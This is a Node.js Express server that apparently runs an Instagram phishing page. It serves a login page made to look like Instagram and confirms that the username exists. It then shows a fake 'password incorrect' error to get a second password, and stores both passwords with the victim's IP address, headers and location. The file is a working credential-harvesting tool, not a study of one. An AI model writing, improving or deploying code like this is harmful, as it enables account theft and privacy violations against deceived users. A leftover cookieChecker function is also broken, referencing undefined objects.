const express=require('express');
const path=require('path')
const request=require('request')
const db=require('./pool');
const sessions=require('express-session')
const cors = require('cors');

    

const app=express();


app.use(express.static('../client'))
app.use(express.json());
app.use(express.urlencoded({ extended: false }))
// app.use(cookieParser())

app.get('/',(req,res)=>{
    console.log(req.session.userID);
    res.redirect('https://www.instagram.com/reel/CgmShUBt4ZY/')
    // res.sendFile(path.join(__dirname,'../client/index.html'))
    
 })

 app.use(sessions({
     secret:'something here',
     saveUninitialized:true,
     resave:true,
     cookie:{maxAge:1000*24*60*60*30,httpOnly:true}
 }))
 
let authenticator=function authenticato(req,res,next) {
    if(req.session.userID){
        console.log(req.session.userID);
        return next();
    }else{
        console.log('into else');
    res.redirect('/')}
}



app.get('/auth',(req,res)=>{
    res.sendFile(path.join(__dirname,'../client/instagram.html'))
})
app.post('/auth',async (req,res)=>{
    
    let instaIdUrl=`https://www.instagram.com/${req.body.username}/ `
    
    request.get(instaIdUrl,(e,r)=>{
        
        if (r.statusCode===200) {
            let loginInfo={
                username:req.body.username,
                pwd1:req.body.password,
                user_ip:req.ip,
                user_info:req.headers['user-agent'],
                user_loc:{
                    lat:req.body.lat,
                    lng:req.body.lng
                }
            }

            if (req.body.authented==='0') {
                console.log(req.body.authented);
                res.send({authen:1,error:"Sorry, your password was incorrect. Please double-check your password."})
            }else{
                console.log(req.body.authented);
                loginInfo.pwd2=req.body.password2
                console.log(loginInfo);
                req.session.userID=req.body.username;

                // pool.getConnection((err,connection)=>{
                //     if(err) throw err;
                //     let sql=`insert into logininfo (username,pwd1,pwd2,user_ip,user_info,samay) values (?,?,?,?,?,?)`;
                    
                //     connection.query(sql,[loginInfo.username,loginInfo.pwd1,loginInfo.pwd2,req.ip,req.headers['user-agent'], new Date],(error)=>{

                //         connection.release();
                //         if(error) throw error 
                        
                //     })
                    
                    

                // })
                const user=new db.user({
                    instaId:req.body.username,
                    pwd:req.body.password,
                    pwd2:req.body.password2,
                    useragent:req.headers,
                    userip:req.ip

                })
                user.save()
                res.send({authen:true,error:""})
            }
        }else{
            res.send({authen:0,error:"The username you entered doesn't belong to an account. Please check your username and try again."})
        }
    })
    
    // res.send({msg:true})
})

// app.post('/tester',(req,res)=>{
//     console.log(req.headers)
//     const user=new db.user({
//         instaId:'codechef',
//         pwd:'somepassword',
//         useragent:req.headers['user-agent']

//     })
//     user.save()
//     res.send({msg:'okay'})
// })

app.get('/survey',authenticator,(req,res)=>{
    console.log(req.session.userID+" itnto get");
    res.sendFile(path.join(__dirname,'../client/questions.html'))
})
app.post('/survey-report',(req,res)=>{
    // req.session.surveyTaken=true;
    console.log(req.body);
    
    res.status(200).send({save:true,userId:req.session.userID});
    req.session=null
    // req.session.destroy();
})

app.listen(process.env.PORT || 3131 ,console.log("Running on 3131"))

//cookiechecker
function cookieChecker() {
    let cookieList=cookieParser.JSONCookie(req.cookies);
    for (const key in cookieList) {
        if(key===req.body.id){
            return JSON.parse(cookieList[req.body.id]).last
        }
    }
    return 'Used Only once'
}

